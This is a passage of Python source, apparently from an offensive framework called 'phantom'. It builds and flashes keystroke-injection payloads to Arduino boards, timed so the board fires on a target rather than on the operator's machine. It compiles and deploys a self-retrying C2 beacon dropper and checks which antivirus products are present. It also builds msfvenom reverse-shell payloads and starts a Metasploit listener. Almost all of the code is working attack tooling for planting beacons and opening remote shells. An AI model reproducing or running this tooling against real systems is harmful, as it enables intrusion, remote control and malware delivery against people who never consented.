                           "<id>, or --stager <os>)")
            return

        # 9.2 — the artefact is for ONE os and the inventory knows which:
        # comparing them here is what turns "the board typed a PowerShell
        # one-liner into a Linux box" from a discovery made with the board in
        # hand into a refusal made at the keyboard.
        if payload_platform and payload_platform != "unknown" and target \
                and payload_platform != target:
            notifier.error(
                f"the payload is built for {payload_platform} but the board "
                f"would type it into {target}: PE ≠ ELF ≠ Mach-O — regenerate "
                f"it for {target} (`generate {target}`) or point --type-into "
                f"at {payload_platform}.")
            return
        if payload_platform and payload_platform != "unknown" and not target:
            notifier.warn(
                f"payload built for {payload_platform} and no --type-into "
                f"given: pass `--type-into {payload_platform}` so the opener "
                f"and the command warnings describe the box it lands on.")

        # A command on the wrong side of the fence is almost always a typo,
        # but a valid shell command can CONTAIN those words: suggest, then
        # ask. --strict is the operator's explicit refusal, not the default.
        hints = mismatch_hints(command, target)
        if hints:
            for hint in hints:
                notifier.warn(hint)
            if strict:
                notifier.error(f"--strict: refusing to write a mismatched "
                               f"payload. {hints[0]}")
                return
            if not _confirm_typing():
                notifier.warn("cancelled: nothing written.")
                return
        # A FLASH MUST LOOK LIKE A NEW BUILD TO THE BOARD. The first-boot tag is
        # derived from the artefact's content, so re-flashing the SAME artefact
        # produced the SAME tag: justFlashed() said false, the shot counter
        # spent by the previous delivery stayed at zero, and the freshly flashed
        # board typed nothing on the target (measured 2026-11-01). A per-flash
        # nonce makes "has this board been reflashed" true every time, which is
        # also what resets the counter exactly once.
        if not build_nonce and flash:
            import secrets as _secrets
            build_nonce = _secrets.token_hex(4)
        try:
            payload = build_hid_payload(board, command, target=target,
                                        layout=layout,
                                        delay_ms=delay_ms,
                                        press_enter=press_enter,
                                        open_run=open_run,
                                        arm=arm, arm_pin=arm_pin,
                                        eject=eject,
                                        char_delay_ms=char_delay_ms,
                                        countdown_s=countdown_s,
                                        first_boot_safe=first_boot_safe,
                                        shots=shots,
                                        build_nonce=build_nonce)
        except ValueError as exc:
            notifier.error(str(exc))
            return

        import os
        if not out:
            from phantom.utils.paths import data_dir
            name = f"{board_arg}_{payload.filename}"
            if board in ARDUINO_BOARDS:
                # the Arduino IDE refuses a sketch whose folder is not named
                # after the .ino file: put it in a folder of the same name
                stem = os.path.splitext(name)[0]
                name = os.path.join(stem, f"{stem}.ino")
            out = os.path.join(data_dir(), "vectors", name)
        os.makedirs(os.path.dirname(os.path.abspath(out)), exist_ok=True)
        with open(out, "w", encoding="utf-8", newline="\n") as handle:
            handle.write(payload.content)
        notifier.success(f"HID payload written: {out}")
        for note in payload.notes:
            notifier.warn(note)
        for note in board_notes(board):
            notifier.info(note)
        if flash:
            if board in ARDUINO_BOARDS and not arm:
                # The Leonardo resets into setup() the moment the upload
                # finishes, so a board still plugged into the machine you are
                # sitting at CAN type on THAT machine. Two things stop it, and
                # both are on by default for the first boot: the per-build
                # EEPROM tag (the boot right after a flash is silent) and
                # --eject (the board leaves the bus instead of typing).
                # Warning about a keystroke that cannot happen teaches the
                # operator to ignore the warning that can.
                if eject or first_boot_safe:
                    notifier.info(
                        "this board will not type on THIS machine: the "
                        "first-boot guard and/or --eject keep it silent "
                        "through the upload. It fires on the next power-up, "
                        "i.e. where you carry it.")
                else:
                    notifier.warn(
                        "this board types as soon as it is powered, and the "
                        f"upload just ran it on THIS machine "
                        f"({flash_port or 'auto'}). Unplug it "
                        "now if you did not mean to type here; --arm prevents "
                        "it at the cost of a button on --arm-pin.")
            from phantom.utils.arduino_flash import flash_sketch, fqbn_for
            notifier.status(
                f"Flashing {os.path.basename(out)} to "
                f"{flash_port or 'the board arduino-cli finds'} "
                f"with arduino-cli...")
            result = flash_sketch(os.path.dirname(os.path.abspath(out)),
                                  flash_port,
                                  # "" here means "whatever the board says it
                                  # is": the flasher detected it from
                                  # arduino-cli board list, so pinning the
                                  # Micro FQBN would undo that detection.
                                  fqbn=(fqbn or fqbn_for(board_arg) or ""),
                                  cli=(arduino_cli or None))
            for step in result.steps:
                notifier.info(f"  {step.summary()}")
                if not step.ok and step.output:
                    notifier.warn(step.output[-400:])
            if result.ok:
                notifier.success(result.summary())
            else:
                notifier.error(result.summary())
                if not flash_port and not result.steps:
                    # Nothing was compiled, so the run stopped BEFORE the
                    # toolchain: the bench was empty, had more than one
                    # board, or the board is a clone the toolchain does not
                    # name. The escape hatch is the port the operator can
                    # read off `arduino-cli board list` themselves. A failed
                    # COMPILE carries steps, so it never gets this hint.
                    notifier.info(
                        "no board was selected automatically: pass the port "
                        "(`--flash COM7`) or pin the board id "
                        "(`--fqbn arduino:avr:leonardo`).")
        session.add_note(f"HID payload ({board_arg or board}) -> {out}")

    def _get_lhost(self) -> str:
        """Auto-detect local IP (VPN/tun0 or default route)."""
        from phantom.utils.network import get_lhost
        return get_lhost()

    def _guess_os(self) -> tuple:
        """Detect the target OS, in confidence order, and SAY when it failed.

        Sources, best first: the shared WorldModel `os` finding (the senior
        source — the scan wrote it there), the nmap XML saved by the scan,
        the raw scan output held in the session. Returns
        (os_string, arch, platform) as before.

        When nothing was detected the answer is marked ASSUMED and the
        operator is WARNED: the old code returned "Unknown (defaulting to
        Linux x64)" in silence, and the caller shipped a Linux beacon to
        targets that were never identified — the wrong kernel family, with
        no trace of the guess.
        """
        from phantom.utils.target_platform import (
            assumed_linux, from_findings, from_os_string, resolve)

        target = session.target
        answer = None

        # 0. Shared WorldModel os finding (written by scan / reasoning)
        try:
            from phantom.core.knowledge import session_wm
            answer = from_findings(session_wm(), source="shared knowledge")
        except Exception:
            answer = None

        # 1. XML-based OS detection (most accurate string available)
        if target and (answer is None or not answer.known):
            xml_os = _detect_os_from_xml(target)
            if xml_os:
                answer = resolve(answer,
                                 from_os_string(xml_os, source="scan XML"))

        # 2. Fallback: the raw scan output held in the session
        if answer is None or not answer.known:
            scan_data = session.get_result("scan")
            if scan_data and isinstance(scan_data, dict):
                text = " ".join(str(v) for v in scan_data.values())
                if text.strip():
                    answer = resolve(answer,
                                     from_os_string(text, source="scan output"))

        # 3. Nothing detected: state the default instead of hiding it
        if answer is None or not answer.known:
            answer = assumed_linux("no os signal")
            notifier.warn(
                f"Target OS not detected: using the default "
                f"{answer.platform}/{answer.arch} — if the target is "
                f"Windows/macOS build the right artefact (e.g. "
                f"`generate windows`) or run an os_detect.")
        return answer.os_name, answer.arch, answer.platform

    def _suggest_payload(self, arch: str, platform: str) -> str:
        """Return the suggested payload key based on detected OS."""
        if platform == "windows":
            return "7" if arch == "x64" else "8"  # windows meterpreter or shell
        else:
            return "3" if arch == "x64" else "5"  # linux meterpreter or x86 shell

    def _suggest_format(self, platform: str) -> str:
        """Return suggested format key based on platform."""
        return "6" if platform == "windows" else "1"  # exe or elf

    def do_deploy(self, _):
        """deploy — build and preflight PHANTOM's OWN C++ beacon dropper for
        the detected target platform (the same binary the auto-mode ships),
        then print the one-liner to execute on the target."""
        os_string, arch, platform = self._guess_os()
        from phantom.utils import config as cfg
        from phantom.utils.network import c2_use_ssl
        # ONE resolution for the endpoint the beacon DIALS. `c2.host` defaults
        # to 127.0.0.1, which is correct for a lab on this box and useless for
        # a remote target — and the typed stager has always resolved with
        # `get_c2_endpoint()` (env -> config -> this box's LAN address). Two
        # resolvers for one endpoint is how a payload gets built for a host
        # the operator never saw, or for a tunnel that is already dead.
        from phantom.utils.network import get_c2_endpoint
        c2_host, c2_port = get_c2_endpoint()
        # same rule as the HID stager: the scheme follows the listener (and
        # `c2.ssl`), never a literal True
        use_ssl = c2_use_ssl()
        notifier.info(f"Target platform: {platform} ({arch}) — {os_string}")
        notifier.info(f"C2 callback: {c2_host}:{c2_port}")
        try:
            from phantom.utils.builder import generate_dropper, compile_beacon
            from phantom.utils.c2_crypto import beacon_config_endpoint
            import phantom
            beacon_dir = os.path.join(os.path.dirname(phantom.__file__),
                                      "payloads", "beacon")
            # rebuild only when the embedded ENDPOINT changed (comparing the
            # whole generated header always differed, forcing a full
            # recompile on every build)
            binary = compile_beacon(
                platform, os.path.dirname(phantom.__file__),
                force_rebuild=(beacon_config_endpoint(beacon_dir)
                               != (c2_host, c2_port)), arch=arch,
                host=c2_host, port=c2_port, use_ssl=use_ssl)
            if not binary:
                notifier.error("Beacon build failed (cross-toolchain missing?)")
                return
        except Exception as e:
            notifier.error(f"Beacon build failed: {e}")
            return
        # sandbox preflight of the compiled binary (best-effort: backends
        # missing just means 'no verdict', never a crash)
        #
        # The verdict is RECORDED, not just printed (measured 2026-11-03).
        # This block used to end at a notifier line inside a bare `except`, so
        # a drop that reached quarantine, a drop that never executed and a
        # drop nobody scanned looked identical in the report. The record
        # separates the three facts, and only the first may read as clean.
        from phantom.utils.defender_check import preflight_record
        preflight = {"backend": "", "approved": False,
                     "summary": "no sandbox backend available — UNSCANNED",
                     "scanned": False}
        try:
            from phantom.automation.sandbox.sandbox import SandboxEngine
            from phantom.utils import beacon_artifacts
            # The builder seals the plaintext at rest, so the path handed
            # back may not exist on disk: preflight the SAME bytes through a
            # throw-away copy instead of skipping the check.
            staged = binary
            data = beacon_artifacts.payload(binary)
            if data is not None and not os.path.exists(binary):
                import tempfile
                handle = tempfile.NamedTemporaryFile(delete=False,
                                                     suffix=".bin")
                handle.write(data)
                handle.close()
                staged = handle.name
            verdict = SandboxEngine().preflight(staged)
            preflight = preflight_record(verdict)
            if preflight["scanned"] and preflight["approved"]:
                notifier.success(
                    f"Sandbox preflight: APPROVED — {preflight['summary']}")
            else:
                notifier.warn(f"Sandbox preflight: {preflight['summary']}")
        except Exception as exc:
            preflight = {"backend": "", "approved": False,
                         "summary": (f"sandbox unavailable "
                                     f"({type(exc).__name__}) — UNSCANNED"),
                         "scanned": False}
            notifier.warn("Sandbox preflight unavailable (no backend) — skipping.")
        # One record, on the session, so the report can state what happened
        # instead of the operator having to remember a warning they scrolled
        # past. Never raises: a missing session must not fail a deploy.
        try:
            session.add_note(
                f"Payload preflight ({platform}): "
                + (f"scanned — {preflight['summary']}"
                   if preflight["scanned"] else
                   f"UNSCANNED — {preflight['summary']}"))
            session.knowledge_base.setdefault("preflight", {})["deploy"] = \
                dict(preflight)
        except Exception:
            pass
        # RESILIENT by default: this one-liner is pasted by hand and may be
        # run before the C2 is up (a physical drop, a staged exfil). If the
        # first download fails it schedules its own retry with the endpoint
        # already embedded, so the operator types it once and walks away.
        dropper = generate_dropper(platform, c2_host, c2_port,
                                   use_ssl=use_ssl, resilient=True)
        if not dropper:
            notifier.error("No dropper defined for this platform.")
            return
        # Windows targets: say out loud that Defender may eat the drop. The
        # measured failure (2026-11-02) was a beacon whose process stayed alive
        # with no check-in, which reads as "the payload crashed" unless the
        # operator is told quarantine is a separate explanation. Warning only:
        # this path NEVER disables an injection technique or changes its exit.
        #
        # The note answers the TARGET question (2026-11-03): it used to be
        # gated on THIS box having Defender, so an operator on Linux or macOS
        # deploying to Windows was told nothing — about the one machine where
        # the payload actually runs.
        # ...and it names EVERY registered AV, not just Defender (measured
        # 2026-11-03 on this box: SecurityCenter2 answers Defender AND McAfee
        # while WinDefend is stopped, so the old Defender-only answer was both
        # wrong and silent about the product that is actually installed).
        # ONE enumeration for the whole deploy: the probe starts a PowerShell
        # (~1 s) and there is no reason to pay for it twice.
        from phantom.utils.defender_check import av_note, av_products
        from phantom.utils.defender_check import is_target_windows
        _av = av_products() if is_target_windows(platform) else []
        _defender = av_note(platform, products=_av)
        if _defender:
            notifier.warn(_defender)
            if _av:
                session.add_note("AV on the operator box: " + ", ".join(
                    str(p.get("name")) for p in _av))
        if is_target_windows(platform) and not preflight.get("scanned"):
            notifier.warn(
                "This build was NOT scanned by any local engine: 'not "
                "detected' would be a guess here, not a result. The "
                "quarantine history on the target is the only evidence.")
        console.print(f"\n[bold green][+] Deploy command (run on target):[/]")
        console.print(f"    [yellow]{dropper}[/]\n")
        session.add_note(f"Payload: {platform} beacon built for {c2_host}:{c2_port}")
        # The beacon is told to check in HERE, so this is where a listener has
        # to exist — announcing "the beacon checks in" with nothing listening
        # was the manual path's version of a false success (audit §1.2).
        from phantom.core.automode import ensure_c2_listener
        # One resolver, so the dropper's port and the listener's port CANNOT
        # disagree any more: the "start the listener on <port>" warning this
        # replaces existed only because the two were resolved in two places.
        if ensure_c2_listener():
            notifier.success(f"C2 listener up on port {c2_port} — the beacon "
                             f"has somewhere to check in.")
        else:
            notifier.warn(f"No C2 listener on port {c2_port}: the beacon "
                          f"would have nowhere to check in. Start one "
                          f"('phantom --c2' -> 'listeners start {c2_port}'), "
                          f"or the dropper's first fetch retries on its own.")
        notifier.info("The beacon checks in to your C2 — 'phantom --c2' -> "
                      "'beacons' to interact.")

    def do_generate(self, _):
        """Interactive payload generation wizard with auto OS/arch detection."""
        console.print("\n[bold]-- PAYLOAD GENERATOR --[/]\n")

        # Auto-detect
        os_string, arch, platform = self._guess_os()
        lhost = self._get_lhost()

        notifier.info(f"Auto-detected Target OS: {os_string} ({arch})")
        notifier.info(f"LHOST: {lhost}")
        notifier.info(f"Target: {session.target or 'not set'}")
        console.print()

        # Payload types (include custom)
        from phantom.utils.payload_manager import get_custom_beacons
        custom_beacons = get_custom_beacons()
        
        all_payloads = PAYLOAD_TYPES.copy()
        
        # Add custom beacons as entries 9, 10, ...
        custom_mapping = {}
        for i, beacon in enumerate(custom_beacons, start=9):
            all_payloads[str(i)] = (beacon["command"], f"{beacon['description']} ({beacon['platform']})")
            custom_mapping[str(i)] = beacon

        # Payload type
        suggested_payload = self._suggest_payload(arch, platform)
        for k, (_, desc) in all_payloads.items():
            marker = " [dim](suggested)[/]" if k == suggested_payload else ""
            console.print(f"  [{k}] {desc}{marker}")

        while True:
            payload_choice = input(f"\n  Payload type [{suggested_payload}]: ").strip() or suggested_payload
            
            # Allow exit commands
            if payload_choice.lower() in ["back", "exit", "quit", "q"]:
                notifier.warn("Cancelled payload generation.")
                return
            
            # Validate choice
            if payload_choice in all_payloads or payload_choice in custom_mapping:
                break
            else:
                notifier.error(f"Invalid choice '{payload_choice}'. Enter a number from the list, or 'back' to exit.")
        
        if payload_choice in custom_mapping:
            beacon = custom_mapping[payload_choice]
            cmd = beacon['command']

            console.print(f"\n[bold green]Custom Beacon:[/bold green] [yellow]{beacon['description']}[/yellow]")
            console.print(f"[bold]Deployment command (to run on target):[/bold]\n    [yellow]{cmd}[/]\n")

            # Remove auto-execution because it runs LOCALLY on the pentester's machine.
            # Instead, just provide the command and instructions.
            notifier.info("Copy the command above and execute it on the compromised target.")
            notifier.warn("Note: Automatic execution is disabled for security reasons (it would run locally).")
            return

        payload_str, payload_desc = all_payloads.get(payload_choice, PAYLOAD_TYPES[suggested_payload])

        # Output format
        suggested_fmt = self._suggest_format(platform)
        console.print()
        for k, (_, desc) in FORMATS.items():
            marker = " [dim](suggested)[/]" if k == suggested_fmt else ""
            console.print(f"  [{k}] {desc}{marker}")

        while True:
            fmt_choice = input(f"\n  Output format [{suggested_fmt}]: ").strip() or suggested_fmt
            
            if fmt_choice.lower() in ["back", "exit", "quit", "q"]:
                notifier.warn("Cancelled payload generation.")
                return
            
            if fmt_choice in FORMATS:
                break
            else:
                notifier.error(f"Invalid format '{fmt_choice}'. Enter a number from the list, or 'back' to exit.")
        
        fmt_str, fmt_desc = FORMATS.get(fmt_choice, FORMATS[suggested_fmt])

        # LPORT validation
        while True:
            lport = input("  LPORT [4444]: ").strip() or "4444"
            
            if lport.lower() in ["back", "exit", "quit", "q"]:
                notifier.warn("Cancelled payload generation.")
                return
            
            try:
                port_num = int(lport)
                if 1 <= port_num <= 65535:
                    break
                else:
                    notifier.error(f"Port must be between 1 and 65535.")
            except ValueError:
                notifier.error(f"Invalid port '{lport}'. Enter a number 1-65535, or 'back' to exit.")
        
        out_file = input(f"  Output filename [shell.{fmt_str}]: ").strip() or f"shell.{fmt_str}"
        if out_file.lower() in ["back", "exit", "quit", "q"]:
            notifier.warn("Cancelled payload generation.")
            return

        cmd = f"msfvenom -p {payload_str} LHOST={lhost} LPORT={lport} -f {fmt_str} -o {out_file}"

        console.print(f"\n[bold][+] Generated command:[/]")
        console.print(f"    [yellow]{cmd}[/]\n")
        console.print("  [1] Execute + start listener automatically")
        console.print("  [2] Show command only (copy manually)")
        console.print("  [3] Edit command before executing")

        while True:
            action = input("\n  Choice [2]: ").strip() or "2"
            
            if action.lower() in ["back", "exit", "quit", "q"]:
                notifier.warn("Cancelled payload generation.")
                return
            
            if action in ["1", "2", "3"]:
                break
            else:
                notifier.error(f"Invalid choice '{action}'. Enter 1, 2, 3, or 'back' to exit.")

        if action == "1":
            run_command(cmd)
            notifier.success(f"Payload saved: {out_file}")
            self._start_listener(lport, payload_str)

        elif action == "2":
            console.print(f"\n  [yellow]{cmd}[/]\n")

        elif action == "3":
            new_cmd = input(f"  Edit command:\n  [{cmd}]\n  > ").strip()
            if new_cmd:
                run_command(new_cmd)
            else:
                run_command(cmd)

    def _start_listener(self, port: str, payload: str):
        """Start Metasploit multi/handler for the generated payload."""
        from phantom.modules.handler import HandlerModule
        notifier.status("Starting Metasploit listener...")
        HandlerModule().start_listener(port, payload)

    def do_run(self, _):
        self.do_generate(_)

    def _execute_flow(self, _):
        self.do_generate(_)
